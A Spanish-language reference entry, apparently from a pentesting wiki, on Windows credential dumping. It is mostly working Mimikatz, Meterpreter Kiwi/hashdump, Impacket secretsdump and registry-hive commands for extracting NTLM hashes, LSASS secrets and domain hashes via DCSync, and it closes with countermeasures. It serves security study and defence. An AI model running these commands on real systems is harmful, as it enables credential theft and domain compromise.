---
title: Credential Dumping (Volcado de Credenciales)
slug: credential-dumping
aliases: [Credential Dump, mimikatz, LSASS dump, DCSync, DPAPI, NTLM dump, hash dump, secretsdump]
fase: [Post-Explotación]
plataforma: Windows
dificultad: Intermedia
mitre: [T1003.001, T1003.002]
related: [pass-the-hash, enumeracion-kerberos, explotacion-hash-cracking, golden-ticket, silver-ticket, pass-the-ticket]
learning_refs: []
---

# Credential Dumping (Volcado de Credenciales)

## Descripción
El volcado de credenciales (credential dumping) es la extracción de hashes de contraseñas, contraseñas en texto plano y tickets Kerberos desde la memoria del sistema, la base de datos SAM, el registro de Windows o el archivo NTDS.dit del controlador de dominio. Esta técnica es fundamental en post-explotación ya que las credenciales obtenidas permiten movimiento lateral (Pass-the-Hash, Pass-the-Ticket), acceso a recursos adicionales y escalada de privilegios en entornos Active Directory. Los hashes NTLM extraídos pueden ser crackeados offline o reutilizados directamente sin conocer la contraseña original.

## Herramientas
- **Mimikatz** (`sekurlsa::logonpasswords`, `lsadump::sam`, `lsadump::dcsync`) — herramienta principal para extracción de credenciales en Windows
- **Kiwi** (módulo de Metasploit, `creds_all`, `lsa_dump_sam`) — integración de Mimikatz en Meterpreter
- **secretsdump.py** (Impacket) — volcado remoto de SAM, LSA secrets y NTDS.dit
- **hashdump** (comando Meterpreter) — extracción rápida de hashes de la SAM
- **reg.exe** — exportación de hives del registro para extracción offline

## Comandos / Ejemplos

### Volcado con Kiwi (Meterpreter)
```
# Cargar módulo Kiwi (requiere SYSTEM o migración a lsass.exe)
meterpreter > load kiwi

# Obtener todas las credenciales disponibles
meterpreter > creds_all
# Resultado: muestra credenciales MSV (NTLM), Kerberos, wdigest, etc.

# Volcado específico de hashes MSV (NTLM)
meterpreter > creds_msv

# Volcado de credenciales Kerberos (pueden incluir texto plano)
meterpreter > creds_kerberos

# Volcado de la base de datos SAM
meterpreter > lsa_dump_sam
# Resultado: hashes NTLM de todos los usuarios locales

# Volcado de LSA secrets
meterpreter > lsa_dump_secrets
```

### Volcado con Mimikatz directamente
```
# Elevar privilegios a SYSTEM (si no se tiene)
mimikatz # privilege::debug
mimikatz # token::elevate

# Obtener credenciales de memoria LSASS
mimikatz # sekurlsa::logonpasswords
# Resultado: usuario, dominio, hash NTLM, y posiblemente contraseña en texto plano

# Volcado de la base de datos SAM
mimikatz # lsadump::sam

# DCSync — simular replicación de DC para obtener hashes del dominio
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
# Resultado: hash NTLM del administrador del dominio

# Volcado completo del dominio
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

### Volcado con hashdump (Meterpreter)
```
# Requiere privilegios SYSTEM
meterpreter > hashdump
# Resultado:
# Administrator:500:aad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
# Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Formato: usuario:RID:hash_LM:hash_NTLM:::
```

### Volcado remoto con Impacket
```bash
# Volcado remoto usando credenciales o hashes
impacket-secretsdump administrator:Password123@10.10.10.50

# Volcado usando hash NTLM (pass-the-hash)
impacket-secretsdump -hashes :e3c61a68f1b89ee6c8ba9507378dc88d administrator@10.10.10.50

# Volcado de NTDS.dit desde controlador de dominio
impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL
```

### Extracción offline del registro
```bash
# En la víctima — exportar hives del registro
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Transferir archivos al atacante y extraer hashes
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## Contramedidas
- Habilitar Credential Guard en Windows 10/11 y Server 2016+ para proteger credenciales en memoria
- Deshabilitar WDigest authentication: `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` → `UseLogonCredential = 0`
- Implementar Protected Users security group en Active Directory para prevenir almacenamiento de credenciales en caché
- Habilitar LSA Protection (RunAsPPL) para proteger el proceso LSASS
- Monitorear accesos a LSASS: Event ID 4656 (handle request) y Event ID 10 en Sysmon (ProcessAccess a lsass.exe)
- Restringir privilegios `SeDebugPrivilege` a solo los administradores que lo requieran
- Rotar credenciales de cuentas privilegiadas regularmente y usar LAPS para contraseñas locales

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1003.001: OS Credential Dumping: LSASS Memory. https://attack.mitre.org/techniques/T1003/001/
- MITRE Corporation. (2024). ATT&CK Technique T1003.002: OS Credential Dumping: Security Account Manager. https://attack.mitre.org/techniques/T1003/002/
- gentilkiwi. (s.f.). *Mimikatz* [Software]. GitHub. https://github.com/gentilkiwi/mimikatz
- fortra. (s.f.). *Impacket* [Software]. GitHub. https://github.com/fortra/impacket
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
